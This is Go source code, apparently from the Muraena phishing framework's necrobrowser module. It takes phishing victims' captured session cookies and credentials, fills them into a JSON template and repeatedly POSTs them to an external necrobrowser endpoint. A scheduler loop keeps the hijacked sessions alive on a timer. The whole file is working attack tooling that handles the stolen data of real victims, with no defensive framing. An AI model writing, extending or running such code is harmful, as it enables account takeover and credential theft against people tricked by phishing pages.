package necrobrowser

import (
	"encoding/json"
	"strings"
	"time"

	"gopkg.in/resty.v1"

	"github.com/muraenateam/muraena/core/db"
)

// KeepaliveOnce sends a single keepalive task for a victim to necrobrowser.
func (module *Necrobrowser) KeepaliveOnce(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) {
	var necroCookies []SessionCookie
	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
	for _, c := range cookieJar {
		t, err := time.Parse(timeLayout, c.Expires)
		if err != nil {
			continue
		}
		necroCookies = append(necroCookies, SessionCookie{
			Name: c.Name, Value: c.Value, Domain: c.Domain, Expires: t.Unix(),
			Path: c.Path, HTTPOnly: c.HTTPOnly, Secure: c.Secure, Session: t.Unix() < 1,
		})
	}
	cj, err := json.MarshalIndent(necroCookies, "", "\t")
	if err != nil {
		module.Warning("keepalive cookie marshal error: %s", err)
		return
	}

	body := module.KeepaliveTemplate
	body = strings.ReplaceAll(body, TrackerPlaceholder, victimID)
	body = strings.ReplaceAll(body, CookiePlaceholder, string(cj))
	body = strings.ReplaceAll(body, CredentialsPlaceholder, credentialsJSON)

	resp, err := resty.New().R().
		SetHeader("Content-Type", "application/json").
		SetBody(body).
		Post(module.Endpoint)
	if err != nil {
		module.Warning("keepalive POST error for %s: %s", victimID, err)
		return
	}
	module.Verbose("keepalive %s -> %s", victimID, resp.Status())
}

// RunKeepaliveScheduler periodically pings necrobrowser for due victims.
func (module *Necrobrowser) RunKeepaliveScheduler() {
	for {
		kas, err := db.GetAllKeepalives()
		if err != nil {
			module.Debug("keepalive registry error: %s", err)
		}
		now := time.Now()
		for _, ka := range kas {
			if ka.Enabled != "1" {
				continue
			}
			next, _ := time.Parse(time.RFC3339, ka.NextRun)
			if ka.NextRun != "" && now.Before(next) {
				continue
			}
			v, err := db.GetVictim(ka.VictimID)
			if err != nil {
				continue
			}
			creds, _ := json.MarshalIndent(v.Credentials, "", "\t")
			module.KeepaliveOnce(v.ID, v.Cookies, string(creds))

			interval := 10
			if ka.IntervalMin != "" {
				if n, err := time.ParseDuration(ka.IntervalMin + "m"); err == nil {
					interval = int(n.Minutes())
				}
			}
			_ = db.TouchKeepalive(v.ID, now, now.Add(time.Duration(interval)*time.Minute))
		}
		time.Sleep(30 * time.Second)
	}
}
